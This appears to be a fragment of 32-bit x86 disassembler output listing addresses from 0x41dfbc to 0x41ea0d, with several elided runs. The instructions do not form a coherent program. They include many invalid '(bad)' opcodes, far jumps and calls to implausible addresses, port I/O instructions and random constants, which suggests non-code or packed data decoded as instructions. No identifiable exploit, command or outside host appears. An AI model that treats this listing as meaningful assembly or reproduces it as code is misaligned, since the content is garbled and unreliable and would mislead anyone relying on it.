  41dfbc:	dec    esp
  41dfbd:	mov    bh,0xe8
  41dfbf:	lods   al,BYTE PTR ds:[esi]
  41dfc0:	cmp    cl,BYTE PTR [ecx]
  41dfc2:	ja     0x41df6d
  41dfc4:	or     ebp,edx
  41dfc6:	push   esi
  41dfc7:	xchg   ebx,eax
  41dfc8:	stc    
  41dfc9:	pusha  
  41dfca:	cmp    DWORD PTR [ecx],ebx
  41dfcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dfcd:	leave  
  41dfce:	adc    ah,BYTE PTR [eax-0xe]
  41dfd1:	arpl   dx,sp
  41dfd3:	sbb    eax,0xb575d0bb
  41dfd8:	imul   esi,DWORD PTR [ecx+0x7c2b9e30],0xd0020239
  41dfe2:	dec    ecx
  41dfe3:	ins    BYTE PTR es:[edi],dx
  41dfe4:	jl     0x41dfa8
  41dfe6:	jl     0x41e01e
  41dfe8:	push   edi
  41dfe9:	gs inc eax
  41dfeb:	xor    DWORD PTR [ebx-0x29b4f206],eax
  41dff1:	mov    ds:0xa714f643,eax
  41dff6:	loope  0x41dfcf
  41dff8:	js     0x41dfbc
  41dffa:	mov    edx,0x7a7559e0
  41dfff:	mov    cl,0x1f
  41e001:	ins    DWORD PTR es:[edi],dx
  41e002:	jmp    0x190a2004
  41e007:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e008:	sbb    BYTE PTR [edx+0x259e7005],dl
  41e00e:	jo     0x41e054
  41e010:	inc    ecx
  41e011:	or     edx,DWORD PTR [edx]
  41e013:	fadd   DWORD PTR [edx+0x38060ddc]
  41e019:	xor    BYTE PTR [esp+ebp*1+0x3f],bl
  41e01d:	xor    eax,0xd3c977c
  41e022:	into   
  41e023:	std    
  41e024:	imul   ebx,DWORD PTR [ecx-0x1ab226fe],0xffffffe6
  41e02b:	mov    ebp,0x1cd5e79b
  41e030:	push   ss
  41e031:	and    DWORD PTR [edi-0x58353231],edx
  41e037:	or     BYTE PTR [edi],ah
  41e039:	push   ebx
  41e03a:	bound  edx,QWORD PTR [edx]
  41e03c:	push   edi
  41e03d:	idiv   bh
  41e03f:	bound  edi,QWORD PTR [ecx-0x27]
  41e042:	clc    
  41e043:	popf   
  41e044:	push   cs
  41e045:	xchg   ebx,eax
  41e046:	int3   
  41e047:	lods   eax,DWORD PTR ds:[esi]
  41e048:	jns    0x41e039
  41e04a:	ja     0x41e067
  41e04c:	sbb    edx,DWORD PTR [edx+edx*8]
  41e04f:	xchg   cl,al
  41e051:	cwde   
  41e052:	mov    ch,0x25
  41e054:	data16 fimul DWORD PTR [ebp+0x59f8e8bd]
  41e05b:	(bad)  
  41e05c:	call   0x689fbe19
  41e061:	std    
  41e062:	dec    ecx
  41e063:	in     eax,dx
  41e064:	mov    esp,0xd11a8f9f
  41e069:	jae    0x41e030
  41e06b:	or     edi,edi
  41e06d:	inc    esi
  41e06e:	sbb    BYTE PTR [edi-0x6a],0x99
  41e072:	les    ebp,FWORD PTR [edx-0x695bfe54]
  41e078:	mov    al,0x42
  41e07a:	popf   
  41e07b:	fisubr WORD PTR [ebx-0x1a67ce4]
  41e081:	dec    ebx
  41e082:	jge    0x41e0b8
  41e084:	rcr    BYTE PTR [edx],cl
  41e086:	and    DWORD PTR [ebp-0x263e0abc],ebp
  41e08c:	add    ebx,0x5b64
	...
  41e0f2:	add    BYTE PTR [eax],al
  41e0f4:	dec    edi
  41e0f5:	push   ebx
  41e0f6:	add    al,0xc
  41e0f8:	sbb    al,0x5f
  41e0fa:	dec    edi
  41e0fb:	push   ebx
  41e0fc:	out    0x6d,eax
  41e0fe:	aad    0x48
  41e100:	mov    ebx,0x8c518355
  41e105:	aas    
  41e106:	add    DWORD PTR [eax],eax
  41e108:	add    al,0x1
  41e10a:	add    BYTE PTR [eax],al
  41e10c:	add    ecx,DWORD PTR [edi]
  41e10e:	pop    es
  41e10f:	xchg   ecx,eax
  41e110:	arpl   WORD PTR [ebx-0x1],si
  41e113:	into   
  41e114:	mov    gs,WORD PTR [eax-0x1131ce58]
  41e11a:	outs   dx,DWORD PTR ds:[esi]
  41e11b:	cld    
  41e11c:	jp     0x41e0e1
  41e11e:	push   0xe7b81c97
  41e123:	sub    DWORD PTR [ecx],ecx
  41e125:	ds popw ds
  41e128:	jns    0x41e149
  41e12a:	out    dx,eax
  41e12b:	push   ebp
  41e12c:	fsubrp st(0),st
  41e12e:	xchg   DWORD PTR [ebp+0x26928257],eax
  41e134:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e135:	push   cs
  41e136:	cmp    ch,BYTE PTR [ecx]
  41e138:	xchg   ebp,eax
  41e139:	mov    ds:0x2b456580,al
  41e13e:	repz (bad) 
  41e140:	adc    al,0x3d
  41e142:	jmp    0x41e121
  41e144:	cmc    
  41e145:	inc    eax
  41e146:	pushf  
  41e147:	test   ebp,esi
  41e149:	in     eax,0x49
  41e14b:	xor    cl,bh
  41e14d:	repnz sub BYTE PTR [esi-0x77],bl
  41e151:	xchg   edx,eax
  41e152:	lahf   
  41e153:	repz mov ecx,0x14f321b8
  41e159:	arpl   WORD PTR [ebx+eiz*4-0x25ff5a16],bp
  41e160:	and    eax,0x350e52b5
  41e165:	retf   0x7992
  41e168:	push   0x18
  41e16a:	or     al,0x93
  41e16c:	je     0x41e1bd
  41e16e:	mov    ds,WORD PTR [edx+0x5b]
  41e171:	push   edx
  41e172:	(bad)  
  41e173:	(bad)  
  41e174:	jnp    0x41e141
  41e176:	and    BYTE PTR [edx],ah
  41e178:	mov    ch,0xd1
  41e17a:	and    DWORD PTR ds:0xed179d09,0xffffffbb
  41e181:	(bad)  
  41e182:	mov    ds:0x73125ec3,eax
  41e187:	jns    0x41e152
  41e189:	mov    ah,0xcc
  41e18b:	adc    al,0xaa
  41e18d:	(bad)  
  41e18e:	dec    eax
  41e18f:	add    DWORD PTR [ebp+0x7c7f1125],ebx
  41e195:	(bad)  
  41e196:	mov    esp,0xf995cd20
  41e19b:	cmp    BYTE PTR [eax+0x1a64f910],dh
  41e1a1:	inc    ecx
  41e1a2:	test   eax,0x37255a5f
  41e1a7:	cmc    
  41e1a8:	gs push esi
  41e1aa:	sbb    edi,DWORD PTR [eax+ecx*2-0x4405d52a]
  41e1b1:	jo     0x41e1df
  41e1b3:	dec    ecx
  41e1b4:	push   ds
  41e1b5:	fsubr  DWORD PTR [ebp+ecx*2-0x478af41d]
  41e1bc:	test   eax,0xb57c9fc
  41e1c1:	retf   0xe076
  41e1c4:	jl     0x41e245
  41e1c6:	stos   DWORD PTR es:[edi],eax
  41e1c7:	mov    ah,0x71
  41e1c9:	dec    edi
  41e1ca:	out    dx,eax
  41e1cb:	leave  
  41e1cc:	lea    esi,[edi-0x65]
  41e1cf:	dec    ebx
  41e1d0:	mov    edx,0xc7a2bada
  41e1d5:	jns    0x41e198
  41e1d7:	pop    edx
  41e1d8:	or     al,0x4b
  41e1da:	test   al,0xa1
  41e1dc:	xchg   esp,eax
  41e1dd:	div    DWORD PTR [eax+0x29]
  41e1e0:	fdivr  DWORD PTR [ecx+0x3d7774b0]
  41e1e6:	(bad)  
  41e1e7:	pop    ecx
  41e1e8:	not    DWORD PTR [ebx+ebx*1-0x1124cab5]
  41e1ef:	ins    BYTE PTR es:[edi],dx
  41e1f0:	fwait
  41e1f1:	shr    DWORD PTR [edi-0x7e],1
  41e1f4:	adc    esi,edi
  41e1f6:	dec    ecx
  41e1f7:	test   al,0x29
  41e1f9:	les    ebp,FWORD PTR [edx]
  41e1fb:	jmp    0x8f4b:0xc588113
  41e202:	xor    al,0x89
  41e204:	not    DWORD PTR [ebx-0x7e]
  41e207:	loopne 0x41e1cc
  41e209:	jmp    0xff480bad
  41e20e:	adc    eax,0x6c
	...
  41e273:	add    BYTE PTR [ebx-0x1988fe],ch
  41e279:	idiv   DWORD PTR [ebx+0x6f64c34f]
  41e27f:	or     al,0xd2
  41e281:	(bad)  
  41e283:	ret    0x4090
  41e286:	add    DWORD PTR [eax],eax
  41e288:	add    al,0x1
  41e28a:	add    BYTE PTR [eax],al
  41e28c:	cld    
  41e28d:	pop    ds
  41e28e:	shl    BYTE PTR [ecx-0x7e87809],1
  41e294:	mov    ah,0x1c
  41e297:	sbb    eax,0xa6dcb99d
  41e29c:	out    dx,eax
  41e29d:	scas   eax,DWORD PTR es:[edi]
  41e29e:	adc    edx,ecx
  41e2a0:	push   ecx
  41e2a1:	fdiv   st,st(5)
  41e2a3:	sar    BYTE PTR [ebx+0x3a6c2c39],cl
  41e2a9:	es sti 
  41e2ab:	push   es
  41e2ac:	add    al,0xcb
  41e2ae:	stos   BYTE PTR es:[edi],al
  41e2af:	in     al,0x19
  41e2b1:	jmp    0x41e246
  41e2b3:	cmp    cl,BYTE PTR [eax-0x1e]
  41e2b6:	imul   eax,DWORD PTR [ecx],0x4ab04f77
  41e2bc:	sbb    al,0xe8
  41e2be:	sar    ecx,0x68
  41e2c1:	nop
  41e2c2:	and    BYTE PTR [ecx+0x253e85a8],0x80
  41e2c9:	or     BYTE PTR [eax-0x14],ah
  41e2cc:	leave  
  41e2cd:	cmp    al,0xd9
  41e2cf:	sub    BYTE PTR [eax-0x193a5cb0],0xf0
  41e2d6:	cmp    edi,DWORD PTR [esi+0x11]
  41e2d9:	jl     0x41e2cf
  41e2db:	mov    bl,0xca
  41e2dd:	ror    BYTE PTR [eax-0x1d17d7b3],cl
  41e2e3:	push   es
  41e2e4:	dec    esi
  41e2e5:	and    eax,0x9a863057
  41e2ea:	adc    ebp,DWORD PTR [eax+0x6011df00]
  41e2f0:	and    al,0x13
  41e2f2:	mov    ds:0x1ec21e74,al
  41e2f7:	test   DWORD PTR [ebp-0x21a33797],edx
  41e2fd:	int3   
  41e2fe:	(bad)  
  41e2ff:	inc    eax
  41e300:	sbb    al,0xa4
  41e302:	enter  0xd9e6,0x41
  41e306:	arpl   WORD PTR [edi-0x507638ec],di
  41e30c:	leave  
  41e30d:	xchg   BYTE PTR [ecx],ch
  41e30f:	push   ecx
  41e310:	loopne 0x41e320
  41e312:	fwait
  41e313:	pusha  
  41e314:	in     al,dx
  41e315:	test   eax,0x555aadc2
  41e31a:	int3   
  41e31b:	cmc    
  41e31c:	pop    esp
  41e31d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e31e:	and    BYTE PTR [ecx+ebx*2+0x7f42d4c2],ch
  41e325:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e326:	mov    DWORD PTR [esi-0x64d8180],ebx
  41e32c:	push   esi
  41e32d:	(bad)  
  41e32e:	xor    DWORD PTR [edx],edi
  41e330:	jnp    0x41e368
  41e332:	sti    
  41e333:	ins    BYTE PTR es:[edi],dx
  41e334:	fwait
  41e335:	sbb    ecx,0xefcd1c9f
  41e33b:	mov    edi,0x109b671f
  41e340:	dec    esi
  41e341:	xchg   esi,eax
  41e342:	retf   
  41e343:	jae    0x41e36d
  41e345:	jae    0x41e2fa
  41e347:	mov    edi,0xb634dadc
  41e34c:	retf   0x3412
  41e34f:	nop
  41e350:	jno    0x41e365
  41e352:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e353:	js     0x41e3c5
  41e355:	or     BYTE PTR [eax],cl
  41e357:	cmp    BYTE PTR [edx+0x12],dh
  41e35a:	push   cs
  41e35b:	mov    eax,DWORD PTR [ebp-0x76]
  41e35e:	jmp    0x41e3de
  41e360:	test   DWORD PTR [ebx+0x4496558a],edx
  41e366:	fimul  WORD PTR [ebp*8-0x5476da9]
  41e36d:	mov    BYTE PTR [edx],bl
  41e36f:	lds    edi,FWORD PTR [edx+0x3]
  41e372:	ins    BYTE PTR es:[edi],dx
  41e373:	call   0x7525c8b4
  41e378:	out    0xc9,al
  41e37a:	ret    0x38b4
  41e37d:	lock sub bh,BYTE PTR [esi-0x1950fe5b]
  41e384:	cmc    
  41e385:	test   eax,0x6f8c29c9
  41e38a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e38b:	call   DWORD PTR [esi+0xec77f9]
	...
  41e3f1:	add    BYTE PTR [eax],al
  41e3f3:	add    BYTE PTR [ecx-0xe088ee],cl
  41e3f9:	jg     0x41e3e4
  41e3fb:	xchg   esi,eax
  41e3fc:	or     DWORD PTR [edx+0x18],0x21c92209
  41e403:	mov    BYTE PTR [ecx+eax*2+0x1040001],dl
  41e40a:	add    BYTE PTR [eax],al
  41e40c:	mov    edi,0xf1ba2d2c
  41e411:	push   ebp
  41e412:	dec    esp
  41e413:	into   
  41e414:	sahf   
  41e415:	xchg   BYTE PTR [edx],ah
  41e417:	inc    edi
  41e418:	xor    eax,0xfa32406d
  41e41d:	fld    QWORD PTR [esp+ebp*1+0x5fd2756]
  41e424:	mov    edx,0xfd43d3db
  41e429:	and    eax,0x292f118a
  41e42e:	jmp    0x41e499
  41e430:	mov    edi,0xd60feb79
  41e435:	out    0x15,eax
  41e437:	ret    
  41e438:	mov    edi,0xe2c922b0
  41e43d:	xchg   esi,eax
  41e43e:	add    dh,BYTE PTR [eax]
  41e440:	test   bl,dh
  41e442:	sub    eax,0x12341387
  41e447:	gs lahf 
  41e449:	clc    
  41e44a:	fdiv   DWORD PTR [edx-0x6e843584]
  41e450:	jno    0x41e4a5
  41e452:	push   esi
  41e453:	add    bl,dl
  41e455:	cmp    DWORD PTR [edx-0x704474f],ebx
  41e45b:	test   al,0xd7
  41e45d:	add    ch,cl
  41e45f:	inc    ebx
  41e460:	inc    ebx
  41e461:	inc    ebx
  41e462:	push   ss
  41e463:	mov    ecx,0x84dc011b
  41e468:	inc    esp
  41e469:	hlt    
  41e46a:	scas   al,BYTE PTR es:[edi]
  41e46b:	inc    esp
  41e46c:	and    ch,BYTE PTR [edx-0x102af462]
  41e472:	sub    edx,DWORD PTR [eax-0x5d7bef75]
  41e478:	lods   eax,DWORD PTR ds:[esi]
  41e479:	dec    esp
  41e47a:	and    esp,esp
  41e47c:	div    BYTE PTR [ecx-0x4b]
  41e47f:	push   edx
  41e480:	and    DWORD PTR [edx+0x6b4838c],edi
  41e486:	mov    BYTE PTR [ebx-0x77],bh
  41e489:	add    ah,BYTE PTR [ebx+0x3eba1c60]
  41e48f:	in     al,dx
  41e490:	jmp    0x41e412
  41e492:	stos   DWORD PTR es:[edi],eax
  41e493:	sahf   
  41e494:	push   0x908a43be
  41e499:	lahf   
  41e49a:	pop    ds
  41e49b:	and    edx,0x2ab23c3c
  41e4a1:	push   eax
  41e4a2:	ror    DWORD PTR [ecx-0x51],0x28
  41e4a6:	gs mov dl,0x82
  41e4a9:	mov    esp,0x4e44a75e
  41e4ae:	fdiv   QWORD PTR [esi-0x3400699a]
  41e4b4:	jno    0x41e4c2
  41e4b6:	or     DWORD PTR [ebx-0x14566293],esi
  41e4bc:	or     DWORD PTR [edx],ecx
  41e4be:	inc    esi
  41e4bf:	imul   edi,DWORD PTR [ecx+0x7],0xffffffb8
  41e4c3:	cld    
  41e4c4:	dec    eax
  41e4c5:	popa   
  41e4c6:	or     DWORD PTR [edx-0x6cb2db09],0x4ae56e07
  41e4d0:	cmp    eax,0xae2f7c7a
  41e4d5:	and    bl,BYTE PTR [ebp-0x7cb98e33]
  41e4db:	mov    al,ds:0xf2a74580
  41e4e0:	push   ecx
  41e4e1:	and    cl,BYTE PTR [eax+0x584c816f]
  41e4e7:	arpl   ax,bx
  41e4e9:	xchg   ebp,eax
  41e4ea:	popf   
  41e4eb:	(bad)  
  41e4ed:	call   0xdaf2:0x689226dc
  41e4f4:	sub    DWORD PTR [edi+0x30],ebp
  41e4f7:	sub    DWORD PTR [ebp+0x2e553ad],esp
  41e4fd:	out    dx,al
  41e4fe:	cmp    esp,DWORD PTR [esi-0x5515fd1c]
  41e504:	adc    dl,BYTE PTR [ebx+0x20]
  41e507:	imul   ecx,DWORD PTR [esi-0x1115ea1a],0x2e
  41e50e:	xchg   edx,eax
  41e50f:	and    al,0x0
	...
  41e571:	add    BYTE PTR [eax],al
  41e573:	add    BYTE PTR [eax],ah
  41e575:	push   0xffffffcb
  41e577:	dec    ebx
  41e578:	retf   
  41e579:	jmp    0x41e51b
  41e57b:	imul   ebp,ebx,0xffffffb1
  41e57e:	aaa    
  41e57f:	je     0x41e5dd
  41e581:	cmp    BYTE PTR [eax+0x1429809],dl
  41e587:	add    BYTE PTR [ecx+eax*1],al
  41e58a:	add    BYTE PTR [eax],al
  41e58c:	push   edx
  41e58d:	or     al,0x8a
  41e58f:	inc    ebx
  41e590:	add    DWORD PTR [ecx-0x6b6c6743],esp
  41e596:	xchg   esp,eax
  41e597:	aas    
  41e598:	test   al,0x9e
  41e59a:	mov    esp,0x7fe86af1
  41e59f:	adc    DWORD PTR [ebx+eax*1-0x71],ebp
  41e5a3:	inc    ebp
  41e5a4:	fldenv [edx]
  41e5a6:	addr16 fadd st(4),st
  41e5a9:	lods   al,BYTE PTR ds:[esi]
  41e5aa:	addr16 int 0x1b
  41e5ad:	xor    DWORD PTR [ebx+0x7a],edi
  41e5b0:	adc    BYTE PTR [ebx+0x2cf0802a],dl
  41e5b6:	scas   al,BYTE PTR es:[edi]
  41e5b7:	mov    bh,BYTE PTR [edx-0x6a]
  41e5ba:	out    0x8a,eax
  41e5bc:	or     ah,ch
  41e5be:	xchg   BYTE PTR [ebx-0x50],bh
  41e5c1:	mov    dl,bl
  41e5c3:	int    0x93
  41e5c5:	pop    ebx
  41e5c6:	xchg   cx,ax
  41e5c8:	mov    ecx,0xbe3b2390
  41e5cd:	sbb    edi,DWORD PTR [edx-0x288e5c05]
  41e5d3:	mov    dh,0x26
  41e5d5:	adc    eax,0xc94d3cae
  41e5da:	pop    ebx
  41e5db:	pop    ecx
  41e5dc:	xchg   dh,dh
  41e5de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e5df:	retf   0x94fe
  41e5e2:	and    eax,0xedd3e674
  41e5e7:	xchg   edi,eax
  41e5e8:	inc    esi
  41e5e9:	cmp    eax,ebx
  41e5eb:	mov    dl,0x1e
  41e5ed:	pushf  
  41e5ee:	cdq    
  41e5ef:	cmp    al,0xa6
  41e5f1:	xchg   BYTE PTR [ebp-0x2248ec65],ah
  41e5f7:	sti    
  41e5f8:	jle    0x41e59d
  41e5fa:	push   0xf71121d4
  41e5ff:	out    dx,al
  41e600:	xor    BYTE PTR ds:0xd60f4b6f,ah
  41e606:	pop    ebx
  41e607:	mov    ?,WORD PTR [esi]
  41e609:	pop    eax
  41e60a:	add    ebp,DWORD PTR [eax+0x60]
  41e60d:	add    dh,ah
  41e60f:	xchg   ebx,eax
  41e610:	jmp    0xb029:0x73349aef
  41e617:	in     eax,dx
  41e618:	jbe    0x41e644
  41e61a:	inc    esp
  41e61b:	xchg   edx,eax
  41e61c:	out    dx,al
  41e61d:	mov    edi,esi
  41e61f:	cmc    
  41e620:	xchg   edx,eax
  41e621:	sbb    dh,ch
  41e623:	mov    ds:0x966c27be,eax
  41e628:	pop    es
  41e629:	call   0xc13c:0x99858ffc
  41e630:	fcmovnu st,st(0)
  41e632:	mov    ch,0x49
  41e634:	ror    ecx,0x96
  41e637:	mov    WORD PTR [ebp+0x7d],ss
  41e63a:	xor    DWORD PTR [ecx+0x40ed3ae6],eax
  41e640:	push   esp
  41e641:	ficom  DWORD PTR [edi]
  41e643:	xchg   esi,eax
  41e644:	mov    ebp,0x66116a2
  41e649:	add    DWORD PTR [esi-0x1d],ecx
  41e64c:	aam    0xaf
  41e64e:	retf   
  41e64f:	pop    eax
  41e650:	(bad)  
  41e652:	sbb    BYTE PTR [eax*2-0x39dc31c4],dl
  41e659:	pop    ss
  41e65a:	lods   al,BYTE PTR ds:[esi]
  41e65b:	push   ss
  41e65c:	push   0x59
  41e65e:	pusha  
  41e65f:	add    BYTE PTR [ebx-0x6e],0x5c
  41e663:	scas   eax,DWORD PTR es:[edi]
  41e664:	loop   0x41e6b1
  41e666:	mov    esp,esi
  41e668:	mov    edx,0x9d40f8a6
  41e66d:	enter  0xc4ae,0xa9
  41e671:	arpl   WORD PTR [ebx+0xf],di
  41e674:	mov    eax,0x773db1df
  41e679:	int3   
  41e67a:	push   ss
  41e67b:	icebp  
  41e67c:	aam    0x41
  41e67e:	mov    ah,0x6e
  41e680:	sar    BYTE PTR [ecx+edi*1],0xa4
  41e684:	add    BYTE PTR [esi-0x75],bl
  41e687:	dec    ebx
  41e688:	adc    eax,0x7d4048c7
  41e68d:	cmp    dl,BYTE PTR [edx-0x1]
	...
  41e6f4:	lds    ebx,FWORD PTR [eax+0x7dfd55e1]
  41e6fa:	cmc    
  41e6fb:	cwde   
  41e6fc:	xchg   esp,eax
  41e6fd:	push   0x37
  41e6ff:	sub    edi,DWORD PTR [edi]
  41e701:	mov    edx,0x439cccad
  41e706:	add    DWORD PTR [eax],eax
  41e708:	add    al,0x1
  41e70a:	add    BYTE PTR [eax],al
  41e70c:	jbe    0x41e70d
  41e70e:	imul   esp,DWORD PTR [ecx-0x3d825c4b],0xffffff93
  41e715:	in     eax,0xb9
  41e717:	jbe    0x41e768
  41e719:	adc    eax,0x40e36d5b
  41e71e:	jae    0x41e6ce
  41e720:	imul   ecx,ebx,0xc4614aeb
  41e726:	push   ebp
  41e727:	mov    ebx,0xb3ff7b1a
  41e72c:	and    BYTE PTR [edx-0x5d],dl
  41e72f:	ret    
  41e730:	aaa    
  41e731:	adc    eax,0x93ae2cba
  41e736:	mov    ch,0xb0
  41e738:	jb     0x41e784
  41e73a:	cs ins BYTE PTR es:[edi],dx
  41e73c:	bound  eax,QWORD PTR ds:0x23dea610
  41e742:	nop
  41e743:	fs ja  0x41e71c
  41e746:	(bad)
  41e74a:	jge    0x41e724
  41e74c:	sub    al,0xb0
  41e74e:	inc    edx
  41e74f:	xor    BYTE PTR [eax+0x64],ah
  41e752:	inc    esi
  41e753:	je     0x41e6e0
  41e755:	imul   ebp,eax,0xab58bdfa
  41e75b:	mov    esi,DWORD PTR [ebx+0x71111fff]
  41e761:	les    dx,DWORD PTR [ebx-0x27f5621]
  41e768:	pusha  
  41e769:	mov    edx,0x48caf0a4
  41e76e:	fidivr WORD PTR [ebx+ebx*2-0x3]
  41e772:	add    esp,eax
  41e774:	push   edi
  41e775:	cld    
  41e776:	xchg   bh,dl
  41e778:	cmp    bl,BYTE PTR [edi+0x59436e87]
  41e77e:	mov    bl,0x7
  41e780:	pop    ds
  41e781:	sbb    BYTE PTR [edx-0x40],cl
  41e784:	cli    
  41e785:	mov    edx,DWORD PTR [eax+0x48]
  41e788:	mov    ds:0x655356de,al
  41e78d:	xchg   ebx,eax
  41e78e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e78f:	(bad)
  41e792:	repnz ins DWORD PTR es:[edi],dx
  41e794:	(bad)  
  41e795:	mov    eax,ds:0xd19b664b
  41e79a:	(bad)  
  41e79b:	push   cs
  41e79c:	cmp    al,0x11
  41e79e:	jmp    0x41e7cc
  41e7a0:	or     DWORD PTR [esi+0x7ef795db],ecx
  41e7a6:	inc    eax
  41e7a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7a8:	fbld   TBYTE PTR [esi+0x54]
  41e7ab:	(bad)  
  41e7ac:	sbb    bl,bl
  41e7ae:	jmp    0xd538fb69
  41e7b3:	es mov ch,0x6b
  41e7b6:	jl     0x41e776
  41e7b8:	enter  0x77cf,0x21
  41e7bc:	xchg   ecx,eax
  41e7bd:	jns    0x41e765
  41e7bf:	sub    eax,0x5a2d6021
  41e7c4:	std    
  41e7c5:	cmp    esp,0xfffffff2
  41e7c8:	dec    edx
  41e7c9:	dec    esi
  41e7ca:	push   edi
  41e7cb:	mov    dh,0x83
  41e7cd:	loopne 0x41e7e3
  41e7cf:	cmp    BYTE PTR [eax+0x49fb80c7],bh
  41e7d5:	repnz dec ebx
  41e7d7:	xchg   ebp,eax
  41e7d8:	out    0xa5,al
  41e7da:	arpl   WORD PTR [ecx+0x11],cx
  41e7dd:	dec    edi
  41e7de:	aaa    
  41e7df:	in     al,0xea
  41e7e1:	pop    es
  41e7e2:	sar    DWORD PTR [ebx+0x6f],cl
  41e7e5:	sub    ch,ch
  41e7e7:	jmp    0x41e81e
  41e7e9:	xchg   ebp,esp
  41e7eb:	jmp    0x63eed1bb
  41e7f0:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41e7f2:	iret   
  41e7f3:	imul   eax,DWORD PTR [eax],0xffffffc0
  41e7f6:	jecxz  0x41e77e
  41e7f8:	sub    DWORD PTR [esi],ecx
  41e7fa:	int3   
  41e7fb:	aas    
  41e7fc:	pop    ebx
  41e7fd:	xchg   edx,eax
  41e7fe:	test   ah,ch
  41e800:	fisttp WORD PTR [ecx+0x10]
  41e803:	cld    
  41e804:	mov    dl,0xef
  41e806:	imul   edx,eax,0x30
  41e809:	and    ch,BYTE PTR [ebp-0x2b]
  41e80c:	and    bh,cl
  41e80e:	fnstsw WORD PTR [edi+0x0]
	...
  41e871:	add    BYTE PTR [eax],al
  41e873:	add    BYTE PTR ds:0x9e5c8a39,ch
  41e879:	(bad)  
  41e87a:	(bad)  
  41e87b:	jns    0x41e8ec
  41e87d:	xor    al,0xcc
  41e87f:	jg     0x41e87b
  41e881:	test   eax,0x44a053e8
  41e886:	add    DWORD PTR [eax],eax
  41e888:	add    al,0x1
  41e88a:	add    BYTE PTR [eax],al
  41e88c:	in     eax,dx
  41e88d:	(bad)  
  41e88e:	push   edx
  41e88f:	or     ch,BYTE PTR [edi]
  41e891:	push   edi
  41e892:	push   ds
  41e893:	sbb    al,BYTE PTR ds:0xbb5b5b9b
  41e899:	jmp    0xa687:0x1894581c
  41e8a0:	scas   al,BYTE PTR es:[edi]
  41e8a1:	or     al,0x8d
  41e8a3:	jecxz  0x41e8cd
  41e8a5:	xor    dl,BYTE PTR [edi+ebp*4+0x3446e564]
  41e8ac:	pop    es
  41e8ad:	sbb    BYTE PTR [edi-0x26c67967],bh
  41e8b3:	and    al,0x7b
  41e8b5:	test   eax,0x54a187ce
  41e8ba:	xlat   BYTE PTR ds:[ebx]
  41e8bb:	mov    dh,0x54
  41e8bd:	xchg   BYTE PTR [ebp-0x602fed9],dh
  41e8c3:	mov    cl,0x14
  41e8c5:	xor    BYTE PTR [esi],dl
  41e8c7:	(bad)  
  41e8c8:	pop    ss
  41e8c9:	addr16 sbb al,0x96
  41e8cc:	fld    DWORD PTR [edi-0x46]
  41e8cf:	jge    0x41e8b9
  41e8d1:	repz popa 
  41e8d3:	imul   eax,DWORD PTR [edi-0x34a6be1],0x61
  41e8da:	jmp    0x41e959
  41e8dc:	mov    eax,0x386fb275
  41e8e1:	xor    al,0x1a
  41e8e3:	es aas 
  41e8e5:	jb     0x41e95d
  41e8e7:	ret    0xfc02
  41e8ea:	stc    
  41e8eb:	dec    edx
  41e8ec:	xor    BYTE PTR [eax+eax*4],0x75
  41e8f0:	sub    BYTE PTR [eax+0x7249d126],bl
  41e8f6:	test   BYTE PTR [ecx],bh
  41e8f8:	add    bl,bh
  41e8fa:	adc    ebx,DWORD PTR [ecx+0x14403aa4]
  41e900:	and    edi,DWORD PTR cs:[edi+0x7c8148dc]
  41e907:	repz mov bh,0xee
  41e90a:	adc    DWORD PTR [ebx+0x7c],ebx
  41e90d:	mov    ebx,0xebd29abc
  41e912:	ror    DWORD PTR ds:0x8cd2f0b8,0x33
  41e919:	jne    0x41e98f
  41e91b:	hlt    
  41e91c:	xchg   ebx,eax
  41e91d:	test   DWORD PTR [ebx+0x79],edx
  41e920:	outs   dx,DWORD PTR ds:[esi]
  41e921:	adc    DWORD PTR [ebp+ebp*2+0x7d355a3d],edx
  41e928:	add    ebx,edi
  41e92a:	dec    edx
  41e92b:	(bad)  
  41e92c:	xor    dl,bl
  41e92e:	add    DWORD PTR [ebx-0x17],ebp
  41e931:	cmp    eax,DWORD PTR [eax-0x57bb2670]
  41e937:	lds    ebp,FWORD PTR [esp+eiz*2+0x55]
  41e93b:	cmovb  esi,DWORD PTR [edx+0x5e3a8125]
  41e942:	lds    esi,FWORD PTR [esi-0x48]
  41e945:	mov    edx,0x7abf2f2
  41e94a:	sbb    DWORD PTR gs:[edi],edi
  41e94d:	retf   
  41e94e:	mov    BYTE PTR [ecx+edi*8+0x1c3842fe],al
  41e955:	push   eax
  41e956:	push   ds
  41e957:	int3   
  41e958:	mov    dh,0x11
  41e95a:	dec    ebx
  41e95b:	into   
  41e95c:	mov    edx,0x5f693b5b
  41e961:	stos   BYTE PTR es:[edi],al
  41e962:	jns    0x41e972
  41e964:	inc    ebp
  41e965:	fs xchg edi,eax
  41e967:	leave  
  41e968:	push   0x27
  41e96a:	cli    
  41e96b:	or     eax,0x3428ca8f
  41e970:	fwait
  41e971:	and    DWORD PTR [esi-0x45],edx
  41e974:	and    eax,0xe585dc38
  41e979:	cld    
  41e97a:	mov    al,0x9
  41e97c:	cwde   
  41e97d:	cmp    edi,eax
  41e97f:	add    eax,0xc4c6b1f7
  41e984:	jne    0x41e983
  41e986:	aad    0x1a
  41e988:	stos   DWORD PTR es:[edi],eax
  41e989:	and    al,0xeb
  41e98b:	adc    dl,bh
  41e98d:	sbb    DWORD PTR ds:0x95,ebp
	...
  41e9f3:	add    BYTE PTR [eax-0x3],bh
  41e9f6:	ret    0xc766
  41e9f9:	jg     0x41e9f7
  41e9fb:	dec    DWORD PTR [edi+0x67]
  41e9fe:	rol    dl,1
  41ea00:	or     bh,ah
  41ea02:	mov    al,0xe2
  41ea04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea05:	inc    ebp
  41ea06:	add    DWORD PTR [eax],eax
  41ea08:	add    al,0x1
  41ea0a:	add    BYTE PTR [eax],al
  41ea0c:	(bad)  
  41ea0d:	mov    WORD PTR [edi],?
